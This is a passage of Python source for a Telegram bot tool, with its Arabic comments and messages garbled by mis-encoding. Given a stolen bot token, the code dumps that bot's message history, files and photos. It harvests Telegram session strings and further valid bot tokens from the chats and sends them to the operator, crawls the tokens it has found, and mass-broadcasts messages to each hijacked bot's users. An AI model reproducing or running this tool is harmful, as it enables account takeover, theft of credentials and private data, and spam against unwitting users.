	        return
	    
	    text = event.text.strip()
	    
	    if text.startswith('/'):
	        return
	    
	    # ØªÙ†ÙÙŠØ° Ø§Ù„Ø¥Ø°Ø§Ø¹Ø© - ÙƒÙ„ Ø¨ÙˆØª ÙŠØ±Ø³Ù„ Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ‡ ÙÙ‚Ø·
	    valid_tokens = user_state['file_tokens']
	    total_bots = len(valid_tokens)
	    
	    stop_events[user_id] = asyncio.Event()
	    stop_button = [[Button.inline("â¹ Ø¥ÙŠÙ‚Ø§Ù", "stop")]]
	    
	    progress_msg = await event.respond(f"ğŸš€ Ø¨Ø¯Ø¡ Ø§Ù„Ø¥Ø°Ø§Ø¹Ø© Ù…Ù† {total_bots} Ø¨ÙˆØª...", buttons=stop_button)
	    
	    total_success = 0
	    total_failed = 0
	    processed_bots = 0
	    
	    last_update_time = 0
	    last_percent = -1
	    
	    async def update_file_broadcast_progress(current_bots, total_bots, success_count, failed_count):
	        nonlocal last_update_time, last_percent
	        if user_id in stop_events and stop_events[user_id].is_set():
	            return False
	            
	        current_time = time.time()
	        current_percent = (current_bots / total_bots) * 100
	        
	        if (current_time - last_update_time >= 5 or 
	            abs(current_percent - last_percent) >= 1 or 
	            current_bots == total_bots):
	            
	            last_update_time = current_time
	            last_percent = current_percent
	            new_text = (
	                f"ğŸ“¤ Ø§Ù„Ø¥Ø°Ø§Ø¹Ø© Ø§Ù„Ø´Ø¨ÙƒÙŠØ©: {current_bots}/{total_bots} ({current_percent:.1f}%)\n"
	                f"âœ… Ù†Ø¬Ø­: {success_count} | âŒ ÙØ´Ù„: {failed_count}"
	            )
	            await safe_edit_message(progress_msg, new_text, stop_button)
	        return True
	    
	    try:
	        for i, token_data in enumerate(valid_tokens):
	            if user_id in stop_events and stop_events[user_id].is_set():
	                break
	            
	            token = token_data['token']
	            try:
	                # ÙƒÙ„ Ø¨ÙˆØª ÙŠØ±Ø³Ù„ Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ‡ ÙÙ‚Ø·
	                users = await extract_users_from_bot(token, user_id)
	                if users:
	                    # Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø¯Ø§Ù„Ø© Ø§Ù„Ø¨Ø« Ø§Ù„Ø³Ø±ÙŠØ¹Ø© Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø©
	                    success, failed = await fast_broadcast_message(
	                        token,  # Ø§Ø³ØªØ®Ø¯Ø§Ù… ØªÙˆÙƒÙ† Ù‡Ø°Ø§ Ø§Ù„Ø¨ÙˆØª
	                        users,  # Ø¥Ø±Ø³Ø§Ù„ Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠ Ù‡Ø°Ø§ Ø§Ù„Ø¨ÙˆØª ÙÙ‚Ø·
	                        text,
	                        None,  # Ù„Ø§ Ù†Ø­ØªØ§Ø¬ progress callback Ø¯Ø§Ø®Ù„ÙŠ
	                        stop_events.get(user_id)
	                    )
	                    
	                    total_success += success
	                    total_failed += failed
	                
	                processed_bots += 1
	                
	                if not await update_file_broadcast_progress(processed_bots, total_bots, total_success, total_failed):
	                    break
	                    
	            except Exception as e:
	                print(f"Error broadcasting with token {token}: {e}")
	                processed_bots += 1
	                continue
	        
	        if user_id in stop_events:
	            del stop_events[user_id]
	        
	        await progress_msg.edit(
	            f"ğŸ‰ ØªÙ… Ø§Ù„Ø§Ù†ØªÙ‡Ø§Ø¡ Ù…Ù† Ø§Ù„Ø¥Ø°Ø§Ø¹Ø© Ø§Ù„Ø´Ø¨ÙƒÙŠØ©!\n\n"
	            f"ğŸ“Š Ø§Ù„Ù†ØªØ§Ø¦Ø¬:\n"
	            f"â€¢ Ø¹Ø¯Ø¯ Ø§Ù„Ø¨ÙˆØªØ§Øª: {processed_bots}/{total_bots}\n"
	            f"â€¢ âœ… Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ Ø§Ù„Ù†Ø§Ø¬Ø­Ø©: {total_success}\n"
	            f"â€¢ âŒ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ Ø§Ù„ÙØ§Ø´Ù„Ø©: {total_failed}"
	        )
	        
	        user_state['step'] = 'file_tokens_ready'
	        await set_user_state(user_id, user_state)
	        
	    except Exception as e:
	        if user_id in stop_events:
	            del stop_events[user_id]
	        await progress_msg.edit(f"âŒ Ø­Ø¯Ø« Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ Ø§Ù„Ø¥Ø°Ø§Ø¹Ø©: {str(e)}")

	# Ø¥Ø¶Ø§ÙØ© Ø¯Ø§Ù„Ø© Ø§Ù„Ø¨Ø« Ø§Ù„Ø³Ø±ÙŠØ¹Ø© Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø©
    async def fast_broadcast_message(bot_token, user_ids, message_text, progress_callback=None, stop_event=None):
	    """Ø¥Ø±Ø³Ø§Ù„ Ø±Ø³Ø§Ù„Ø© Ø¥Ù„Ù‰ Ù‚Ø§Ø¦Ù…Ø© Ù…Ù† Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ† Ø¨Ø³Ø±Ø¹Ø© 0.1 Ø«Ø§Ù†ÙŠØ© Ù…Ø¹ ØªÙˆÙ‚Ù Ù„Ù„Ø¨ÙˆØªØ§Øª Ø§Ù„ÙƒØ¨ÙŠØ±Ø©"""
	    try:
	        temp_session = os.path.join(SESSION_DIR, f"broadcast_bot_{int(time.time())}")
	        temp_bot = TelegramClient(temp_session, API_ID, API_HASH)
	        await temp_bot.start(bot_token=bot_token)
	        
	        success_count = 0
	        failed_count = 0
	        total_users = len(user_ids)
	        last_update_time = 0
	        
	        for i, user_id in enumerate(user_ids):
	            if stop_event and stop_event.is_set():
	                break
	                
	            try:
	                # Ù…Ø­Ø§ÙˆÙ„Ø© Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ø³Ø§Ù„Ø©
	                await with_telegram_retry(lambda: temp_bot.send_message(int(user_id), message_text))
	                success_count += 1
	                
	            except Exception as e:
	                # ØªØ­Ø³ÙŠÙ† Ø§Ù„ØªØ¹Ø§Ù…Ù„ Ù…Ø¹ Ø§Ù„Ø£Ø®Ø·Ø§Ø¡ Ø§Ù„Ù…Ø®ØªÙ„ÙØ©
	                error_msg = str(e).lower()
	                if "could not find the input entity" in error_msg:
	                    # Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… ØºÙŠØ± Ù…ÙˆØ¬ÙˆØ¯ Ø£Ùˆ Ù…Ø­Ø¸ÙˆØ±
	                    failed_count += 1
	                elif "bots can't send messages to other bots" in error_msg:
	                    # Ù„Ø§ ÙŠÙ…ÙƒÙ† Ø¥Ø±Ø³Ø§Ù„ Ø±Ø³Ø§Ø¦Ù„ Ù„Ù„Ø¨ÙˆØªØ§Øª Ø§Ù„Ø£Ø®Ø±Ù‰
	                    failed_count += 1
	                elif "user is deactivated" in error_msg:
	                    # Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ù…Ø­Ø°ÙˆÙ
	                    failed_count += 1
	                elif "peer id invalid" in error_msg:
	                    # Ù…Ø¹Ø±Ù Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… ØºÙŠØ± ØµØ§Ù„Ø­
	                    failed_count += 1
	                elif "user is blocked" in error_msg:
	                    # Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ù…Ø­Ø¸ÙˆØ±
	                    failed_count += 1
	                else:
	                    # Ø£Ø®Ø·Ø§Ø¡ Ø£Ø®Ø±Ù‰
	                    failed_count += 1
	                    print(f"Error sending to user {user_id}: {e}")
	            
	            # Ø§Ù„ØªÙˆÙ‚Ù 5 Ø«ÙˆØ§Ù†ÙŠ ÙÙ‚Ø· Ø¥Ø°Ø§ ÙƒØ§Ù† Ø¹Ø¯Ø¯ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ† Ø£ÙƒØ«Ø± Ù…Ù† 1000 ÙˆØªÙ… Ø¥Ø±Ø³Ø§Ù„ 500 Ø±Ø³Ø§Ù„Ø©
	            if total_users > 1000 and (i + 1) % 500 == 0 and (i + 1) < total_users:
	                print(f"â¸ï¸ ØªÙˆÙ‚Ù Ù…Ø¤Ù‚Øª Ø¨Ø¹Ø¯ Ø¥Ø±Ø³Ø§Ù„ 500 Ø±Ø³Ø§Ù„Ø© Ù…Ù† Ø£ØµÙ„ {total_users}")
	                await asyncio.sleep(5)
	            
	            # Ø¥Ø±Ø³Ø§Ù„ ÙƒÙ„ 0.1 Ø«Ø§Ù†ÙŠØ© Ø¨Ø¯Ù„Ø§Ù‹ Ù…Ù† 0.3
	            await asyncio.sleep(0.1)
	            
	            # ØªØ­Ø¯ÙŠØ« Ø§Ù„ØªÙ‚Ø¯Ù… ÙƒÙ„ 5 Ø«ÙˆØ§Ù†ÙŠ Ø£Ùˆ Ø¹Ù†Ø¯ Ø§Ù„Ø§Ù†ØªÙ‡Ø§Ø¡
	            current_time = time.time()
	            if progress_callback and (current_time - last_update_time >= 5 or i + 1 == total_users):
	                last_update_time = current_time
	                if not await progress_callback(i + 1, total_users):
	                    break
	        
	        await temp_bot.disconnect()
	        
	        try:
	            if os.path.exists(f"{temp_session}.session"):
	                os.remove(f"{temp_session}.session")
	        except:
	            pass
	        
	        return success_count, failed_count
	        
	    except Exception as e:
	        print(f"Error in fast broadcast: {e}")
	        return 0, total_users
	        
	        

    @bot.on(events.NewMessage(pattern='/dump'))
    async def dump_handler(event):
        user_id = event.sender_id
        # Ø­ÙØ¸ Ø­Ø§Ù„Ø© Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… ÙÙŠ Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
        await set_user_state(user_id, {'step': 'waiting_token'})
        await event.respond("ğŸ”‘  Ø§Ø¯Ø®Ù„ ØªÙˆÙƒÙ† Ø§Ù„Ø¨ÙˆØª Ø§Ù„Ù„ÙŠ Ø¹Ø§ÙŠØ² ØªØ³Ø­Ø¨ Ø±Ø³Ø§ÙŠÙ„Ù‡\n"
                          "Ù…Ø«Ø§Ù„: 123456789:ABCdefGHIjklMNOpqrsTUVwxyz\n\n")

    @bot.on(events.CallbackQuery)
    async def callback_handler(event):
        user_id = event.sender_id
        data = event.data.decode('utf-8')
        
        # Ø§Ø³ØªØ±Ø¬Ø§Ø¹ Ø­Ø§Ù„Ø© Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ù…Ù† Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
        user_state = await get_user_state(user_id)
        if 'token' not in user_state:
            await event.answer("âŒ ÙŠØ§ ÙŠÙ‚Ù„Ø¨ÙŠØŒ Ù…Ø§ Ø¨Ø¯Ø£ØªØ´ Ø§Ù„Ø¹Ù…Ù„ÙŠØ© Ø¨Ø¹Ø¯. Ø§Ø¨Ø¯Ø£ Ø¨ÙƒØªØ§Ø¨Ø© /dump")
            return
            
        bot_token = user_state['token']
        
        if data == 'stop':
            if user_id in stop_events:
                stop_events[user_id].set()
                await event.answer("â¹ ØªÙ… Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„Ø¹Ù…Ù„ÙŠØ©")
            return
            
        if data == 'all_messages':
            if 'max_id' not in user_state:
                await event.answer("âŒ Ù…Ø§ ÙÙŠØ´ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø±Ø³Ø§Ø¦Ù„. Ø¬Ø±Ø¨ ØªØ§Ù†ÙŠ")
                return
                
            max_id = user_state['max_id']
            user_state['start_id'] = 1
            user_state['end_id'] = max_id
            await set_user_state(user_id, user_state)
            
            stop_events[user_id] = asyncio.Event()
            
            await event.answer("ğŸš€ Ø¨Ø¯Ø¡ Ù†Ù‚Ù„ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„...")
            
            stop_button = [[Button.inline("â¹ Ø¥ÙŠÙ‚Ø§Ù", "stop")]]
            progress_msg = await event.edit("ğŸš€ Ø¨Ø¯Ø¡ Ù†Ù‚Ù„ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ Ù…Ù† 1 Ø¥Ù„Ù‰ {}...".format(max_id), buttons=stop_button)
            
            last_update_time = 0
            last_percent = -1  # Ù„Ù„ØªØ£ÙƒØ¯ Ù…Ù† Ø£ÙˆÙ„ ØªØ­Ø¯ÙŠØ«
            async def update_progress(current, total):
                nonlocal last_update_time, last_percent
                if user_id in stop_events and stop_events[user_id].is_set():
                    return False
                    
                current_time = time.time()
                current_percent = (current / total) * 100 if total > 0 else 0
                
                # ØªØ­Ø¯ÙŠØ« ÙÙ‚Ø· Ø¥Ø°Ø§ Ø§Ø®ØªÙ„ÙØª Ø§Ù„Ù†Ø³Ø¨Ø© Ø£Ùˆ Ù…Ø±Øª 5 Ø«ÙˆØ§Ù†ÙŠ
                if (current_time - last_update_time >= 5 or 
                    abs(current_percent - last_percent) >= 1 or 
                    current == total):
                    
                    last_update_time = current_time
                    last_percent = current_percent
                    new_text = "ğŸ“¤ Ø¬Ø§Ø±ÙŠ Ù†Ù‚Ù„ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„: {}/{} ({:.1f}%)".format(current, total, current_percent)
                    await safe_edit_message(progress_msg, new_text, stop_button)
                return True
            
            try:
                source_session = os.path.join(SESSION_DIR, f"source_bot_{int(time.time())}")
                source_bot = TelegramClient(source_session, API_ID, API_HASH)
                await source_bot.start(bot_token=bot_token)
                
                success, failed = await get_chat_history(
                    source_bot, 
                    1, 
                    max_id, 
                    user_id,
                    update_progress,
                    stop_events.get(user_id)
                )
                
                await source_bot.disconnect()
                
                try:
                    if os.path.exists(f"{source_session}.session"):
                        os.remove(f"{source_session}.session")
                except:
                    pass
                
                if user_id in stop_events:
                    del stop_events[user_id]
                
                await progress_msg.edit("ğŸ‰ Ø®Ù„ØµÙ†Ø§ ÙŠØ§ ÙŠÙ‚Ù„Ø¨ÙŠ!\nâœ… Ù†Ø¬Ø­Ù†Ø§ ÙÙŠ Ù†Ù‚Ù„ {} Ø±Ø³Ø§Ù„Ø©\nâŒ ÙØ´Ù„Ù†Ø§ ÙÙŠ Ù†Ù‚Ù„ {} Ø±Ø³Ø§Ù„Ø©".format(success, failed))
                
            except Exception as e:
                if user_id in stop_events:
                    del stop_events[user_id]
                await progress_msg.edit("âŒ ÙŠØ§ ÙŠÙ‚Ù„Ø¨ÙŠØŒ Ø­ØµÙ„ Ø®Ø·Ø£ ÙˆÙ‚Øª Ù†Ù‚Ù„ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„: {}".format(str(e)))
            
        elif data == 'send_files':
            await event.answer("ğŸ“¦ Ø¨Ø¯Ø¡ Ø¬Ù…Ø¹ ÙˆØ¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ù„ÙØ§Øª...")
            
            try:
                if 'analysis' not in user_state or 'files' not in user_state['analysis']:
                    await event.answer("âŒ Ù…Ø§ ÙÙŠØ´ ØªØ­Ù„ÙŠÙ„ Ù„Ù„Ù…Ù„ÙØ§Øª. Ø¬Ø±Ø¨ ØªØ§Ù†ÙŠ")
                    return
                
                source_session = os.path.join(SESSION_DIR, f"source_bot_{int(time.time())}")
                source_bot = TelegramClient(source_session, API_ID, API_HASH)
                await source_bot.start(bot_token=bot_token)
                
                files = user_state['analysis']['files']
                if files:
                    await send_zip_files(
                        bot,  
                        source_bot,  
                        files, 
                        "bot_files", 
                        "ğŸ“¦ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù…Ù„ÙØ§Øª Ù…Ù† Ø§Ù„Ø¨ÙˆØª",
                        user_id,
                        'document'
                    )
                    await event.answer("âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ù„ÙØ§Øª")
                else:
                    await event.answer("âŒ Ù…Ø§ Ù„Ù‚ÙŠØªØ´ Ø£ÙŠ Ù…Ù„ÙØ§Øª")
                
                await source_bot.disconnect()
                
                try:
                    if os.path.exists(f"{source_session}.session"):
                        os.remove(f"{source_session}.session")
                except:
                    pass
                
            except Exception as e:
                await event.answer("âŒ Ø­ØµÙ„ Ø®Ø·Ø£: {}".format(str(e)))
            
        elif data == 'send_photos':
            await event.answer("ğŸ–¼ Ø¨Ø¯Ø¡ Ø¬Ù…Ø¹ ÙˆØ¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±...")
            
            try:
                if 'analysis' not in user_state or 'photos' not in user_state['analysis']:
                    await event.answer("âŒ Ù…Ø§ ÙÙŠØ´ ØªØ­Ù„ÙŠÙ„ Ù„Ù„ØµÙˆØ±. Ø¬Ø±Ø¨ ØªØ§Ù†ÙŠ")
                    return
                
                source_session = os.path.join(SESSION_DIR, f"source_bot_{int(time.time())}")
                source_bot = TelegramClient(source_session, API_ID, API_HASH)
                await source_bot.start(bot_token=bot_token)
                
                photos = user_state['analysis']['photos']
                if photos:
                    await send_zip_files(
                        bot,  
                        source_bot,  
                        photos, 
                        "bot_photos", 
                        "ğŸ–¼ Ø¬Ù…ÙŠØ¹ Ø§Ù„ØµÙˆØ± Ù…Ù† Ø§Ù„Ø¨ÙˆØª",
                        user_id,
                        'photo'
                    )
                    await event.answer("âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±")
                else:
                    await event.answer("âŒ Ù…Ø§ Ù„Ù‚ÙŠØªØ´ Ø£ÙŠ ØµÙˆØ±")
                
                await source_bot.disconnect()
                
                try:
                    if os.path.exists(f"{source_session}.session"):
                        os.remove(f"{source_session}.session")
                except:
                    pass
                
            except Exception as e:
                await event.answer("âŒ Ø­ØµÙ„ Ø®Ø·Ø£: {}".format(str(e)))
            
        elif data == 'send_sessions':
            await event.answer("ğŸ” Ø¨Ø¯Ø¡ Ø¬Ù…Ø¹ ÙˆØ¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¬Ù„Ø³Ø§Øª...")
            
            try:
                if 'analysis' not in user_state:
                    await event.answer("âŒ Ù…Ø§ ÙÙŠØ´ ØªØ­Ù„ÙŠÙ„ Ù„Ù„Ø¬Ù„Ø³Ø§Øª. Ø¬Ø±Ø¨ ØªØ§Ù†ÙŠ")
                    return
                
                zip_buffer = io.BytesIO()
                
                with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
                    if 'sessions' in user_state['analysis']:
                        sessions = user_state['analysis']['sessions']['details']
                        chat_sessions = []
                        seen_sessions = set()
                        
                        for session in sessions:
                            if session.get('source') == 'chat':
                                session_text = session['session']
                                if session_text not in seen_sessions:
                                    seen_sessions.add(session_text)
                                    chat_sessions.append(session_text)
                        
                        if chat_sessions:
                            separated_sessions = []
                            for i, session in enumerate(chat_sessions):
                                separated_sessions.append(session)
                                if i < len(chat_sessions) - 1:
                                    separated_sessions.append("\n" + "-" * 40 + "\n")
                            
                            zip_file.writestr("sessions.txt", "\n".join(separated_sessions))
                
                zip_buffer.seek(0)
                
                await bot.send_file(
                    entity=user_id,
                    file=zip_buffer,
                    caption="ğŸ” Ø§Ù„Ø¬Ù„Ø³Ø§Øª Ø§Ù„Ù…Ø³ØªØ®Ø±Ø¬Ø© Ù…Ù† Ø§Ù„Ø¨ÙˆØª",
                    attributes=[DocumentAttributeFilename("sessions.zip")]
                )
                
                await event.answer("âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¬Ù„Ø³Ø§Øª")
                
            except Exception as e:
                await event.answer("âŒ Ø­ØµÙ„ Ø®Ø·Ø£: {}".format(str(e)))
            
        elif data == 'send_users':
            await event.answer("ğŸ‘¥ Ø¨Ø¯Ø¡ Ø¬Ù…Ø¹ ÙˆØ¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ†...")
            
            try:
                if 'analysis' in user_state and 'user_ids' in user_state['analysis']:
                    users = user_state['analysis']['user_ids']
                else:
                    users = await extract_users_from_bot(bot_token, user_id)
                
                if users:
                    filename = f"user_ids_{user_id}.txt"
                    await save_user_ids_to_file(users, filename)
                    
                    buttons = [
                        [Button.inline("Ø§Ø°Ø§Ø¹Ù‡ğŸ“¢", "broadcast")]
                    ]
                    
                    await bot.send_file(
                        entity=user_id,
                        file=filename,
                        caption="ğŸ‘¥ Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ† Ù…Ù† Ø§Ù„Ø¨ÙˆØª ({})".format(len(users)),
                        attributes=[DocumentAttributeFilename("users.txt")],
                        buttons=buttons
                    )
                    
                    user_state['users_list'] = users
                    await set_user_state(user_id, user_state)
                    
                    try:
                        os.remove(filename)
                    except:
                        pass
                    
                    await event.answer("âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ†")
                else:
                    await event.answer("âŒ Ù…Ø§ Ù„Ù‚ÙŠØªØ´ Ø£ÙŠ Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ†")
                
            except Exception as e:
                await event.answer("âŒ Ø­ØµÙ„ Ø®Ø·Ø£: {}".format(str(e)))
                
        elif data == 'broadcast':
            await event.answer("ğŸ“¢ Ø¨Ø¯Ø¡ Ø¹Ù…Ù„ÙŠØ© Ø§Ù„Ø¥Ø°Ø§Ø¹Ø©...")
            
            if 'users_list' not in user_state:
                await event.answer("âŒ Ù…Ø§ ÙÙŠØ´ Ù‚Ø§Ø¦Ù…Ø© Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ†. Ø¬Ø±Ø¨ ØªØ§Ù†ÙŠ")
                return
            
            users = user_state['users_list']
            user_state['step'] = 'waiting_broadcast_message'
            await set_user_state(user_id, user_state)
            
            await event.edit("ğŸ“¢ Ø§Ø±Ø³Ù„ Ø§Ù„ÙƒÙ„Ø§Ø´ÙŠÙ‡ (Ø§Ù„Ù†Øµ) Ø§Ù„Ø°ÙŠ ØªØ±ÙŠØ¯ Ø§Ù„Ø§Ø°Ø§Ø¹Ù‡ Ø¨Ù‡")
            
        elif data == 'send_tokens':
            await event.answer("ğŸ”‘ Ø¨Ø¯Ø¡ Ø¬Ù…Ø¹ ÙˆØ¥Ø±Ø³Ø§Ù„ Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª...")
            
            try:
                if 'analysis' not in user_state or 'tokens' not in user_state['analysis']:
                    await event.answer("âŒ Ù…Ø§ ÙÙŠØ´ ØªØ­Ù„ÙŠÙ„ Ù„Ù„ØªÙˆÙƒÙ†Ø§Øª. Ø¬Ø±Ø¨ ØªØ§Ù†ÙŠ")
                    return
                
                tokens = user_state['analysis']['tokens']['details']
                
                # ØªØµÙÙŠØ© Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª Ø§Ù„ØµØ§Ù„Ø­Ø© ÙÙ‚Ø·
                valid_tokens = [token for token in tokens if token.get('valid')]
                
                if not valid_tokens:
                    await event.answer("âŒ Ù…Ø§ ÙÙŠØ´ ØªÙˆÙƒÙ†Ø§Øª ØµØ§Ù„Ø­Ø©")
                    return
                
                # Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª Ø§Ù„ØµØ§Ù„Ø­Ø© ÙÙ‚Ø·
                sent_count = 0
                for token_info in valid_tokens:
                    token = token_info['token']
                    bot_info = token_info.get('bot_info', {})
                    
                    message = (
                        "ğŸ‰ ØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ ØªÙˆÙƒÙ† Ø¨ÙˆØª ØµØ§Ù„Ø­!\n\n"
                        f"ğŸ” Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„ØªÙˆÙƒÙ†:\n`{token}`\n\n"
                        f"ğŸ¤– Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¨ÙˆØª:\n"
                        f"â”œ Ø§Ù„Ø§Ø³Ù…: {bot_info.get('bot_name', 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ')}\n"
                        f"â”œ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: @{bot_info.get('bot_username', 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ')}\n"
                        f"â”œğŸ“©Ø¹Ø¯Ø¯ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„: {bot_info.get('total_messages', 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ')}\n"
                        f"â”œğŸ‘¤Ø¹Ø¯Ø¯ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ†: {bot_info.get('total_users', 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ')}\n"
                        f"â”” Ø§Ù„Ø¢ÙŠØ¯ÙŠ: {bot_info.get('bot_id', 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ')}"
                    )
                    
                    # Ø²Ø± Ø§Ù„Ø¥Ø°Ø§Ø¹Ø© Ù…Ù† Ù‡Ø°Ø§ Ø§Ù„Ø¨ÙˆØª
                    broadcast_button = [[Button.inline("ğŸ“¢ Ø¥Ø°Ø§Ø¹Ø© Ù…Ù† Ù‡Ø°Ø§ Ø§Ù„Ø¨ÙˆØª", f"token_broadcast:{token}")]]
                    await bot.send_message(user_id, message, buttons=broadcast_button)
                    sent_count += 1
                    await asyncio.sleep(0.5)
                
                await event.answer(f"âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ {sent_count} ØªÙˆÙƒÙ† ØµØ§Ù„Ø­")
                
            except Exception as e:
                await event.answer(f"âŒ Ø­ØµÙ„ Ø®Ø·Ø£: {str(e)}")
        
        elif data == 'deep_analysis':
            await event.answer("ğŸ” Ø¨Ø¯Ø¡ Ø§Ù„ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø´Ø¨ÙƒÙŠ Ø§Ù„Ù…ØªØ¹Ù…Ù‚...")
            
            stop_events[user_id] = asyncio.Event()
            stop_button = [[Button.inline("â¹ Ø¥ÙŠÙ‚Ø§Ù", "stop")]]
            
            progress_msg = await event.edit("ğŸ” Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø´Ø¨ÙƒÙŠ Ø§Ù„Ù…ØªØ¹Ù…Ù‚...\nğŸ“Š Ø§Ù„ØªÙ‚Ø¯Ù…: 0% | Ø§Ù„Ù…Ø³ØªÙˆÙ‰: 0", buttons=stop_button)
            
            last_update_time = 0
            last_percent = -1
            last_level = -1
            async def update_network_progress(processed, total, level):
                nonlocal last_update_time, last_percent, last_level
                if user_id in stop_events and stop_events[user_id].is_set():
                    return False
                    
                current_time = time.time()
                current_percent = (processed / total) * 100 if total > 0 else 0
                
                # ØªØ­Ø¯ÙŠØ« ÙÙ‚Ø· Ø¥Ø°Ø§ Ø§Ø®ØªÙ„ÙØª Ø§Ù„Ù†Ø³Ø¨Ø© Ø£Ùˆ Ø§Ù„Ù…Ø³ØªÙˆÙ‰ Ø£Ùˆ Ù…Ø±Øª 5 Ø«ÙˆØ§Ù†ÙŠ
                if (current_time - last_update_time >= 5 or 
                    abs(current_percent - last_percent) >= 1 or 
                    level != last_level):
                    
                    last_update_time = current_time
                    last_percent = current_percent
                    last_level = level
                    
                    new_text = f"ğŸ” Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø´Ø¨ÙƒÙŠ Ø§Ù„Ù…ØªØ¹Ù…Ù‚...\nğŸ“Š Ø§Ù„ØªÙ‚Ø¯Ù…: {current_percent:.1f}% | Ø§Ù„Ù…Ø³ØªÙˆÙ‰: {level}"
                    await safe_edit_message(progress_msg, new_text, stop_button)
                return True
            
            try:
                analysis_result = await deep_network_analysis(
                    bot_token,
                    user_id,
                    update_network_progress,
                    stop_events.get(user_id)
                )
                
                if user_id in stop_events:
                    del stop_events[user_id]
                
                if analysis_result['success']:
                    stats = analysis_result['aggregated_stats']
                    
                    # ØªØ®Ø²ÙŠÙ† ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø´Ø¨ÙƒØ© ÙÙŠ Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
                    await set_network_analysis(user_id, analysis_result)
                    
                    # Ø¥Ø¶Ø§ÙØ© Ø±Ø³Ø§Ù„Ø© ØªÙˆØ¶Ø­ Ø¥Ø°Ø§ ÙƒØ§Ù† Ø§Ù„ÙØ­Øµ Ø¬Ø²Ø¦ÙŠ
                    completion_message = "âœ… ØªÙ… Ø§Ù„ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø´Ø¨ÙƒÙŠ Ø¨Ù†Ø¬Ø§Ø­!" 
                    if analysis_result.get('partial', False):
                        completion_message = "â¹ ØªÙ… Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„ÙØ­Øµ Ø§Ù„Ø´Ø¨ÙƒÙŠ!\nğŸ“Š Ù‡Ø°Ù‡ Ø§Ù„Ù†ØªØ§Ø¦Ø¬ Ø§Ù„Ø¬Ø²Ø¦ÙŠØ© Ø§Ù„ØªÙŠ ØªÙ… Ø¬Ù…Ø¹Ù‡Ø§:"
                    
                    stats_message = (
                        f"{completion_message}\n\n"
                        f"ğŸ“Š Ø§Ù„Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª Ø§Ù„Ù…Ø¬Ù…Ø¹Ø©:\n"
                        f"â€¢ Ø¹Ø¯Ø¯ Ø§Ù„Ø¨ÙˆØªØ§Øª: {stats['total_bots']}\n"
